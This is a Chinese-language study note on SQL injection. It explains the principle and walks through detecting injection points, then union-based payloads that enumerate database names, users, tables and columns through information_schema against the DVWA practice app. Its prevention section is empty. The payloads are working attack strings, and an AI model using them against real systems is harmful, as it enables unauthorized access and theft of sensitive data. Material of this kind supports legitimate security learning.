### 原理
- SQL 注入攻击是通过将恶意的 SQL 语句插入到应用的输入参数中，再在后台数据库服务器上解析执行进行的攻击
- 业务三层结构：界面层、业务逻辑层、数据访问层
- 由于常常会结合用户的输入数据动态构造 SQL 语句，因此可能发生恶意 SQL 代码的攻击

- 主要威胁：
	- 猜测后台数据，盗取敏感信息
	- 绕过登录认证
	- 注入可以借助数据库的存储过程进行提权等操作
## 攻击步骤
### 寻找注入点
- 找到存在 SQL 注入的参数，SQL 注入大多发生在 GET 或 POST 请求的参数中，当然也有可能发生在其他地方，例如 UserAgent、Cookie 等
- 要是带有参数的动态网页且此网页访问了数据库，那么就有可能存在 SQL 注入。如果程序员没有足够的安全意识，没有进行必要的字符过滤，存在 SQL 注入的可能性就非常大。
	- 如 `http://xxx.xxx.xxx/abcd.php?id=XX`
- 单引号测试法，如果不匹配的单引号导致报错则通常存在 SQL 注入漏洞`http://xxx/abc.php?id=1'`
### 判断注入类型/数据库类型
- SQL 注入按照不同的分类标准，可以分成不同的种类。
#### 联合查询注入
- 主要要保证前后查询列数相同
- 由此可以在系统本身的查询上加上后半部分 union 获取其他数据
- 可以通过 order 确定查询的列数 `SELECT first_name, last_name FROM users WHERE user_id = '1' order by 1`
	- 出现报错时的数目减一就是列数
- `1' union select version(),@@version_compile_os#` 获取**数据库版本和操作系统信息**
### 猜解数据库名
- 猜解后台数据库的库名
-  `1' union select database(),user()#` 获取数据库名称和查询用户名
### 猜解数据表名
- 成功猜解到数据库名称后，进一步猜解某一个特定数据库中数据表的名称
- information_schema 是 mySQL 自带的一张表，这张数据表保存了 MySQL 服务器所有**数据库的信息**, 如数据库名，数据库的表，表栏的数据类型与访问权限等。
- `1' union select table_name,table_schema from information_schema.tables where table_schema= 'dvwa'#` 获取表名和访问权限
### 猜解数据字段名
- 最后是某个特定数据库中特定数据表中的字段，因为获取到字段才能查询数据
- 查看制定表的全部字段名`1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #`
### 技巧
- 末尾添加 `#` 注释掉多余的部分
	- 如原始语句 `SELECT first_name, last_name FROM users WHERE user_id = 'id';` 可以输入 `1' order by 1#`
### SQL 注入类型
#### 数字型
- 判断方式：
	- URL 地址中输入 `http://xxx/abc.php?id= x and 1=1 ` 页面依旧运行正常，继续进行下一步。
	- URL 地址中继续输入 `http://xxx/abc.php?id= x and 1=2` 页面运行错误，则说明此 SQL 注入为数字型注入。
	- 因为如果是数字型会出现 1=2 的逻辑错误，但是字符型不存在问题 `select * from <表名> where id = 'x and 1=1'select * from <表名> where id = 'x and 1=2'`
#### 字符型
- 判断方法：
	- URL 地址中输入 `http://xxx/abc.php?id= x' and '1'='1` 页面运行正常，继续进行下一步。
	- URL 地址中继续输入 `http://xxx/abc.php?id= x' and '1'='2` 页面运行错误，则说明此 SQL 注入为字符型注入。
	- 
### 实例

## 防范